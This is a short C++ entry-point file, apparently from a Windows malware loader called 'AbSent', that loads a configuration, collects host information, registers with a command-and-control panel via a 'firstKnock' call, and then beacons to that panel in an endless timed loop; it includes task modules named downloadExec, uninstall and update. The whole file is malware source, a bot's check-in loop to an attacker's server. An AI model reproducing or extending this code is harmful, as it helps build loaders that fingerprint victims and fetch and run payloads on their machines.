#include "stdafx.h"

#include <iostream>
#include <string>
#include <list>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <chrono>
#include <thread>

#include "AbSent\json.h"
#include "AbSent\config.h"
#include "AbSent\info\info.h"
#include "AbSent\comm\http.h"
#include "AbSent\tasks\downloadExec.h"
#include "AbSent\tasks\uninstall.h"
#include "AbSent\tasks\update.h"

#include "AbSent\comm\panel.h"


int main()
{
	absent::config::config config = absent::config::load();
	absent::info::info info(config.programNeedles);
	std::cout << absent::panel::firstKnock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey).dump(4) << std::endl;
	while (true)
	{
		std::this_thread::sleep_for(std::chrono::minutes(config.reportInt));
		std::cout << absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey) << std::endl;
	}

	return 0;
}